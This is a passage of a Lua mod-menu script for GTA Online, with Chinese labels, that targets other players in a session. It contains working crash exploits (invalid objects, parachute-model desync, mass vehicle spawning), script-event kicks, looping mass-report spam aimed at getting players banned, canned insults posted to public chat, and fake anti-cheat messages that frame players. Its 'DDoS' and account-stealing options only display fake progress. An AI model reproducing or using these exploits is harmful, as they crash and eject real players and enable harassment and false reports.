        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 99999, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
    end)   
    menu.action(cherter, "杀死无敌玩家", {"squish"}, "压死它们，直到它们死去。适用于大多数菜单。(注意：如果目标正在使用无布娃娃，则不会起作用).", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local khanjali = util.joaat("khanjali")
        request_model(khanjali)
        if TASK.IS_PED_STILL(ped) then
            distance = 0.0
        elseif not TASK.IS_PED_STILL(ped) then
            distance = 2.0
        end
        local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, distance, 2.8), ENTITY.GET_ENTITY_HEADING(ped))
        local vehicle2 = entities.create_vehicle(khanjali, pos, 0)
        local vehicle3 = entities.create_vehicle(khanjali, pos, 0)
        local vehicle4 = entities.create_vehicle(khanjali, pos, 0)
        local spawned_vehs = {vehicle1, vehicle2, vehicle3, vehicle4}
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0.0, 0.0, 3.0, 0.0, 0.0, 0.0, -180.0, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0.0, 3.0, 3.0, 0.0, 0.0, 0.0, -180.0, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0.0, 3.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
        util.yield(5000)
        for i = 1, #spawned_vehs do
            entities.delete_by_handle(spawned_vehs[i])
        end
    end) 
    player_toggle_loop(cherter, PlayerID, "移除玩家无敌", {}, "被大多数菜单所拦截.", function()
        util.trigger_script_event(1 << PlayerID, {113023613, PlayerID, 1771544554, math.random(0, 9999)})
    end)
    player_toggle_loop(cherter, PlayerID, "移除载具无敌", {}, "被大多数菜单所拦截.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) and not PED.IS_PED_DEAD_OR_DYING(ped) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
            ENTITY.SET_ENTITY_CAN_BE_DAMAGED(veh, true)
            ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
            ENTITY.SET_ENTITY_PROOFS(veh, false, false, false, false, false, 0, 0, false)
        end
    end)
    local duirenchats = menu.list(online_player, "语言公鸡", {}, "使用语言攻击~")
    menu.divider(duirenchats, "语言公鸡")
    menu.action(duirenchats, "公鸡1", {""}, "公屏上骂他", function()
        chat.send_message(PLAYER.GET_PLAYER_NAME(PlayerID)..cussing1,false,true,true)
    end)
    require("lib/yymmlib/YMcu")
    menu.action(duirenchats, "公鸡2", {""}, "公屏上骂他", function()
        chat.send_message(cussing2..PLAYER.GET_PLAYER_NAME(PlayerID)..cussing2_1,false,true,true)
    end)
    require("lib/yymmlib/YMcu")
    menu.action(duirenchats, "公鸡3", {""}, "公屏上骂他", function()
        chat.send_message(cussing3 ..PLAYER.GET_PLAYER_NAME(PlayerID),false,true,true)
    end)
    require("lib/yymmlib/YMcu")
    menu.action(duirenchats, "公鸡4", {""}, "公屏上骂他", function()
        chat.send_message(cussing4 ..PLAYER.GET_PLAYER_NAME(PlayerID)..cussing4_1,false,true,true)
    end)
    require("lib/yymmlib/YMcu")
    menu.action(duirenchats, "公鸡5", {""}, "公屏上骂他", function()
        chat.send_message(cussing5,false,true,true)
    end)
    require("lib/yymmlib/YMcu")
    menu.action(duirenchats, "公鸡6", {""}, "公屏上骂他", function()
        chat.send_message(PLAYER.GET_PLAYER_NAME(PlayerID)..cussing6,false,true,true)
    end)
    require("lib/yymmlib/YMcu")
    menu.action(duirenchats, "公鸡7", {""}, "公屏上骂他", function()
        chat.send_message(cussing7,false,true,true)
    end)
    require("lib/yymmlib/YMcu")
    menu.action(duirenchats, "公鸡8", {""}, "公屏上骂他", function()
        chat.send_message(cussing8,false,true,true)
    end)
    require("lib/yymmlib/YMcu")
    menu.action(duirenchats, "公鸡9", {""}, "公屏上骂他", function()
        chat.send_message(cussing9,false,true,true)
    end)
    require("lib/yymmlib/YMcu")
    menu.action(duirenchats, "公鸡10", {""}, "公屏上骂他", function()
        chat.send_message(cussing10,false,true,true)
    end)
    require("lib/yymmlib/YMcu")
    menu.action(duirenchats, "公鸡11", {""}, "公屏上骂他", function()
        chat.send_message(PLAYER.GET_PLAYER_NAME(PlayerID)..cussing11,false,true,true)
    end)
    require("lib/yymmlib/YMcu")
    menu.action(duirenchats, "公鸡12", {""}, "公屏上骂他", function()
        chat.send_message(PLAYER.GET_PLAYER_NAME(PlayerID)..cussing12,false,true,true)
    end)
    require("lib/yymmlib/YMcu")
    menu.action(duirenchats, "公鸡13", {""}, "公屏上骂他", function()
        chat.send_message(PLAYER.GET_PLAYER_NAME(PlayerID)..cussing13,false,true,true)
    end)
    require("lib/yymmlib/YMcu")
    menu.action(duirenchats, "公鸡14", {""}, "公屏上骂他", function()
        chat.send_message(PLAYER.GET_PLAYER_NAME(PlayerID)..cussing14,false,true,true)
    end)
    require("lib/yymmlib/YMcu")
    menu.action(duirenchats, "公鸡15", {""}, "公屏上骂他", function()
        chat.send_message(PLAYER.GET_PLAYER_NAME(PlayerID)..cussing15,false,true,true)
    end)
    menu.action(duirenchats, "超级公鸡", {""}, "骂死他", function()
      local notification = b_notifications.new()
      notification.notify("你好陌生人！","游戏并非只有制裁，更多的是带给其他人快乐，希望可以给其他玩家一个好的游戏体验！")
      YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'xinu.png')
      if SCRIPT_MANUAL_START then
    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
    logo_alpha = 0
    logo_alpha_incr = 0.01
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then
                logo_alpha = 0
                util.stop_thread()
            end
            util.yield()
        end
    end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.35, 0.5,0, 3, 3, 3, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 6 then
                logo_alpha_incr = -0.01
            end
            if logo_alpha == 0 then
                util.stop_thread()
            end
            util.yield()
        end
    end)
end
store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound4.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
chat.send_message("夜幕提醒:"..PLAYER.GET_PLAYER_NAME(PlayerID).."请为各位玩家创造一个良好的游戏环境，游戏并非吵架而是放松\n.Nightfall reminds everyone: please create a good game environment for all players, the game is not a fight but a relaxation", false, true, true)
end)
local chattrolls_root = menu.list(online_player, "西普肉的虚假检测", {}, "")
    menu.action(chattrolls_root, "虚假的XIPRO检测1", {}, "用户触发XIPRO检测：Rockstar反作弊 (C1)""\nRID:" ..players.get_rockstar_id(PlayerID), function(click_type)
        local types = {'I3', 'C1', 'C2', 'C3', 'C4', 'C5', 'D1', 'D2', 'D3', 'D4', 'D5', 'E1', 'E2', 'I2', 'I1'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('>玩家 ' .. players.get_name(PlayerID) .. " 正企图使用:" .. det_type .. "攻击XiPro Max玩家.关键哈希: " ..players.get_rockstar_id(PlayerID) .."----¦XiPro Max", false, true, true)
    end)
    menu.action(chattrolls_root, "虚假XIPRO检测崩溃2", {}, "用户触发XIPRO检测：不同的崩溃", function(click_type)
        local types = {'碎片崩溃v1', '碎片崩溃v2', '碎片崩溃v3', '无效载具崩溃', '无效模型崩溃', '悲伤的耶稣崩溃', '脚本事件崩溃v1', '脚本事件崩溃v2', '泡泡糖崩溃', '绿玩保护崩溃', '无效模型崩溃', '莱纳斯崩溃', '董哥崩溃', '美杜莎崩溃', '马桶崩溃'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('>玩家 ' .. players.get_name(PlayerID) .. " 正企图使用:" .. det_type .. "攻击XiPro Max玩家.关键哈希: " ..players.get_rockstar_id(PlayerID) .."----¦XiPro Max", false, true, true)
    end)
    menu.action(chattrolls_root, "虚假XIPRO检测崩溃3", {}, "用户触发XIPRO检测：不同的崩溃", function(click_type)
        local types = {'碎片崩溃v1', '碎片崩溃v2', '碎片崩溃v3', '无效载具崩溃', '无效模型崩溃', '悲伤的耶稣崩溃', '脚本事件崩溃v1', '脚本事件崩溃v2', '泡泡糖崩溃', '绿玩保护崩溃', '无效模型崩溃', '莱纳斯崩溃', '董哥崩溃', '美杜莎崩溃', '马桶崩溃'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('玩家 ' .. players.get_name(PlayerID) .. " 正企图使用:" .. det_type .. "攻击XiPro玩家.关键哈希: " ..players.get_rockstar_id(PlayerID) .."", false, true, true)
    end)
        menu.action(chattrolls_root, "虚假XIPRO检测崩溃4", {}, "用户触发XIPRO检测：不同的崩溃", function(click_type)
        local types = {'无效处理类型', '无效模型崩溃', '无效踢出类型', '无效虚假类型', '脚本事件崩溃v1', '脚本事件崩溃v2', '脚本事件崩溃v3'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('<XiPro警告> ' .. det_type ..  " | 来自玩家: "  .. players.get_name(PlayerID) .."", false, true, true)
    end)
-----------------------------------------------感谢graies提供--------------------------------------------------------------
    menu.action(online_player,"恶意邀请",{},"给他发送一个正常的公寓邀请，如果他同意将进入无限黑屏（STAND无法检测）",function ()
        util.trigger_script_event(1 << PlayerID, {-1891171016,0,PlayerID,1})  
    end)
    local tp_player = menu.list(bozo, "传送玩家到...", {}, "")
    local clubhouse = menu.list(tp_player, "摩托帮会所", {}, "")
    local facility = menu.list(tp_player, "设施", {}, "")
    local warehouse = menu.list(tp_player, "仓库", {}, "")
    local arcade = menu.list(tp_player, "游戏厅", {}, "")
    local cayoperico = menu.list(tp_player, "佩里科岛", {}, "")
    for id, name in pairs(All_business_properties) do
        if id <= 12 then
            menu.action(clubhouse, name, {}, "", function()
                util.trigger_script_event(1 << PlayerID, {879177392, PlayerID, id, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(PlayerID), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(1, 10)})
            end)
        elseif id > 12 and id <= 21 then
            menu.action(facility, name, {}, "", function()
                util.trigger_script_event(1 << PlayerID, {879177392, PlayerID, id, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(PlayerID), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end)
        elseif id > 21 then
            menu.action(arcade, name, {}, "", function() 
                util.trigger_script_event(1 << PlayerID, {879177392, PlayerID, id, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(PlayerID), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
            end)
        end
    end
    menu.action(tp_player, "公寓邀请", {}, "", function()
        util.trigger_script_event(1 << PlayerID, {-168599209, players.user(), PlayerID, -1, 1, 1, 0, 1, 0}) 
    end)
    menu.action(cayoperico, "佩里科岛(有过场动画)", {"tpcayo"}, "", function()
        util.trigger_script_event(1 << PlayerID, {-93722397, PlayerID, 0, 0, 3, 1})
    end)
    menu.action(cayoperico, "佩里科岛(无过场动画)", {"tpcayo2"}, "", function()
        util.trigger_script_event(1 << PlayerID, {-93722397, PlayerID, 0, 0, 4, 1})
    end)
    menu.action(cayoperico, "离开佩里科岛", {"cayoleave"}, "玩家必须在佩里科岛才能触发", function()
        util.trigger_script_event(1 << PlayerID, {-93722397, PlayerID, 0, 0, 3})
    end)
    menu.action(cayoperico, "从佩里科岛踢出", {"cayokick"}, "", function()
        util.trigger_script_event(1 << PlayerID, {-93722397, PlayerID, 0, 0, 4, 0})
    end)
local small = menu.list(warehouse, "小型仓库", {}, "")
    local medium = menu.list(warehouse, "中型仓库", {}, "")
    local large = menu.list(warehouse, "大型仓库", {}, "")
    for id, name in pairs(small_warehouses) do
        menu.action(small, name, {}, "", function()
            util.trigger_script_event(1 << PlayerID, {434937615, PlayerID, 0, 1, id})
        end)
    end
    for id, name in pairs(medium_warehouses) do
        menu.action(medium, name, {}, "", function()
            util.trigger_script_event(1 << PlayerID, {434937615, PlayerID, 0, 1, id})
        end)
    end
    for id, name in pairs(large_warehouses) do
        menu.action(large, name, {}, "", function()
            util.trigger_script_event(1 << PlayerID, {434937615, PlayerID, 0, 1, id})
        end)
    end
    local cpu = menu.list(bozo, "电脑选项", {}, "崩不过就用物理方法搞他")
    menu.action(cpu,"CPU卡机", {}, "让他卡", function() 
		while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) 
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)
		notification("要开始喽！", colors.black)
		menu.trigger_commands("anticrashcamera on")
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		notification("结束！", colors.green) 
		menu.trigger_commands("anticrashcamera off")
		util.yield(5000)
	end)
    menu.action(cpu, "DDoS攻击", {}, "通过向玩家的路由器发送数据包进行DDoS攻击", function()
        util.toast("成功发送DDoS攻击到 " ..players.get_name(PlayerID))
        local percent = 0
        while percent <= 100 do
            util.yield(100)
            util.toast(percent.. "% done")
            percent = percent + 1
        end
        util.yield(3000)
        util.toast("DDos失败，请不要重试~")
    end)
    menu.action(cpu, "获取账户信息", {}, "获取玩家的帐户信息，格式：电子邮件：密码", function()
       util.toast("开始获取账户信息 " ..players.get_name(PlayerID))
        local percent = 0
        while percent <= 100 do
            util.yield(800)
            util.toast(percent.. "%")
            percent = percent + 1
        end
        util.yield(2500)
        util.toast("获取失败，请不要重试~")
    end)
    menu.toggle(cpu,"循环举报", {}, "让他封号", function(on)
        spam = on
        while spam do
            if PlayerID ~= players.user() then
                menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(PlayerID))
                menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(PlayerID))
                menu.trigger_commands("reportannoying " .. PLAYER.GET_PLAYER_NAME(PlayerID))
                menu.trigger_commands("reporthate " .. PLAYER.GET_PLAYER_NAME(PlayerID))
                menu.trigger_commands("reportexploits " .. PLAYER.GET_PLAYER_NAME(PlayerID))
                menu.trigger_commands("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(PlayerID))
            end
            util.yield()
        end
    end)
    require"lib.yymmlib.yymmlib"
    local player_removals = menu.list(bozo, "移除玩家", {}, "")
    menu.divider(player_removals, "踢出")
    menu.action(player_removals, "阻止加入踢", {"blast"}, "将他们踢出并加入黑名单", function()
            blockjoinkick(PlayerID)
            notification( "踢出完成", black)
    end)
    menu.action(player_removals, "CTMD踢", {}, "", function()
            silencekick(PlayerID)
            notification( "踢出完成", black)
    end)
    menu.action(player_removals, "皮卡丘螺旋踢踢", {}, "", function()
           nasakick(PlayerID)
           notification( "踢出完成", black)
    end)        
    menu.action(player_removals, "奇异博士踢", {"freemodedeath"}, "将杀死他们的自由模式并将他们送回故事模式", function()
           freemodekick(PlayerID)
           notification( "踢出完成", black)
    end) 
    menu.action(player_removals, "网络保释踢", {"networkbail"}, "", function()
           networkkick(PlayerID)
           notification( "踢出完成", black)
    end)     
    menu.action(player_removals, "无效掉落踢", {"invalidcollectible"}, "", function()
          invalidcollectiblekick(PlayerID)
          notification( "踢出完成", black)
    end)
    menu.action(player_removals, "螺旋踢", {"luoxuan"}, "", function()
          luoxuankick(PlayerID)
          notification( "踢出完成", black)
    end)
    menu.action(player_removals, "智能踢出 V1", {}, "利用Stand的踢出，可能Stand不让你踢，这得看脸~~", function()
        if NETWORK.NETWORK_IS_HOST() then
            menu.trigger_commands("loveletterkick"..PLAYER.GET_PLAYER_NAME(PlayerID))
        else
            while not NETWORK.NETWORK_IS_HOST() do
                menu.trigger_commands("kick"..PLAYER.GET_PLAYER_NAME(players.get_host()))
                util.yield(2000)
            end
            util.yield(200)
            menu.trigger_commands("loveletterkick"..PLAYER.GET_PLAYER_NAME(PlayerID))
        end
    end)
        menu.action(player_removals, "快速踢出", {"kuaisutichu"}, "", function()
            KickPlayer(PlayerID, "Smart")
        end)

        menu.action(player_removals, "断开连接", {}, "", function()
            KickPlayer(PlayerID, "Breakup")
        end)

        menu.action(player_removals, "黑名单踢", {}, "", function()
            KickPlayer(PlayerID, "Ban")
        end)
function CreateVehicle(Hash, Pos, Heading, Invincible)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if Invincible then
        ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end
function CreatePed(index, Hash, Pos, Heading)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    return SpawnedVehicle
end
function CreateObject(Hash, Pos, static)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_object(Hash, Pos)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if static then
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end
    menu.divider(player_removals, "崩溃")
    menu.action(player_removals, "5g崩溃", {"5gcrash"}, "5gcrash", function()
            x999gcrash(PlayerID)
            notification( "崩溃完成", black)
    end)
    menu.toggle_loop(player_removals, "6g崩溃", {"six6crash"}, "6gcrash", function()
            six6crash(PlayerID)
            notification( "崩溃完成", black)
    end)
    menu.action(player_removals, "可莉崩溃", {"kelicrash"}, "嘣嘣炸弹~", function()
    store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound12.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
    local model_array = {util.joaat("boattrailer"),util.joaat("trailersmall"),util.joaat("raketrailer"),}
		local BAD_attach = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
		local fuck_ped = CreatePed(26 , util.joaat("ig_kaylee"), BAD_attach, 0)
		ENTITY.SET_ENTITY_VISIBLE(fuck_ped, false)
		for i = 1, 3, 1 do
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(fuck_ped, BAD_attach.x, BAD_attach.y, BAD_attach.z)
			for spawn, value in pairs(model_array) do
				local vels = {}
				vels[spawn] = CreateVehicle(value, BAD_attach, 0)
				for attach, value in pairs(vels) do
					ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(value, fuck_ped, 0, 0, true, true)
				end
			end
    SYSTEM.WAIT(500)
    entities.delete_by_handle(fuck_ped)
		end
    end)

    local pclPlayerID = {}
    function get_control_request(ent)
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            local tick = 0
            while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
                tick = tick + 1
                util.yield()
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            end
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            util.toast("Sin control de "..ent)
        end
        return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
    end
function naturecrashv1(PlayerID)
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
    BlockSyncs(PlayerID, function()
        util.yield(100)
        menu.trigger_commands("invisibility on")
        for i = 0, 110 do
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
            PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
            util.yield(50)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        end
        util.yield(250)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        menu.trigger_commands("invisibility off")
    end)
end
function naturecrashv2(PlayerID)
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
    BlockSyncs(PlayerID, function() 
        util.yield(100)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
        util.yield()
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
        util.yield(250)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        util.yield(1000)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
    end)
end
    menu.action(player_removals, "大自然崩溃", {"nature"}, "", function()
        naturecrashv1(PlayerID)
    end) 
    menu.toggle_loop(player_removals, "大自然崩溃 v2", {"hiroshima"}, "", function()
        naturecrashv2(PlayerID)
    end)
    menu.toggle_loop(player_removals, "axery崩溃", {"axery"}, "", function()
        menu.trigger_commands("nature " .. players.get_name(PlayerID))
        menu.trigger_commands("badnetveh " .. players.get_name(PlayerID))
        menu.trigger_commands("byeplague " .. players.get_name(PlayerID))
         notification( "崩溃完成", colors.black)
    end)
    menu.action(player_removals,"圣诞崩溃", {"ctm"}, "圣诞快乐！-", function()
           store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound6.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
	    for i = 1, 10 do
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local cord = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        STREAMING.REQUEST_MODEL(-930879665)
        util.yield(10)
        STREAMING.REQUEST_MODEL(3613262246)
        util.yield(10)
        STREAMING.REQUEST_MODEL(452618762)
        util.yield(10)
        while not STREAMING.HAS_MODEL_LOADED(-930879665) do util.yield() end
        while not STREAMING.HAS_MODEL_LOADED(3613262246) do util.yield() end
        while not STREAMING.HAS_MODEL_LOADED(452618762) do util.yield() end
        local a1 = entities.create_object(-930879665, cord)
        util.yield(10)
        local a2 = entities.create_object(3613262246, cord)
        util.yield(10)
        local b1 = entities.create_object(452618762, cord)
        util.yield(10)
        local b2 = entities.create_object(3613262246, cord)
        util.yield(300)
        entities.delete_by_handle(a1)
        entities.delete_by_handle(a2)
        entities.delete_by_handle(b1)
        entities.delete_by_handle(b2)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(452618762)
        util.yield(10)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3613262246)
        util.yield(10)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-930879665)
        util.yield(10)
        end
        if SE_Notifications then
            notification("崩溃完成.",colors.red)
        end
	end)
   menu.action(player_removals, "啊米崩溃", {"byeplague"}, "威力会不小", function ()
        PlagueCrashPlayer(PlayerID)
         notification( "崩溃完成", black)
    end)
   menu.action(player_removals, "载具发疯崩溃", {"badnetveh"}, "爱他，就要给他车", function ()
        BadNetVehicleCrash(PlayerID)
         notification( "崩溃完成", black)
   end)
local function InvalidObjectCrash(PlayerID)
    BlockSyncs(PlayerID, function() 
	local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
	local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
    local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
    local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
    local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
    for i = 0, 100 do 
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        util.yield(10)
    end
    util.yield(2000)
    entities.delete_by_handle(Object_pizza1)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza3)
    entities.delete_by_handle(Object_pizza4)
    end)
end
local function OpenParachuteCrash(PlayerID)
    local user = players.user()
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    BlockSyncs(PlayerID, function() 
        util.yield(100)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 100, false)
        TASK.TASK_PARACHUTE_TO_TARGET(SelfPlayerPed, SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z)
        util.yield(200)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(SelfPlayerPed)
        util.yield(500)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 100, false)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        util.yield(1000)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(SelfPlayerPed, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, 0, false, false, 0)
    end)
end
local function ChangeParachuteCrash(PlayerID)
    local user = players.user()
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    BlockSyncs(PlayerID, function() 
        util.yield(100)
        for i = 0, 110 do
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
            PED.SET_PED_COMPONENT_VARIATION(SelfPlayerPed, 5, i, 0, 0)
            util.yield(50)
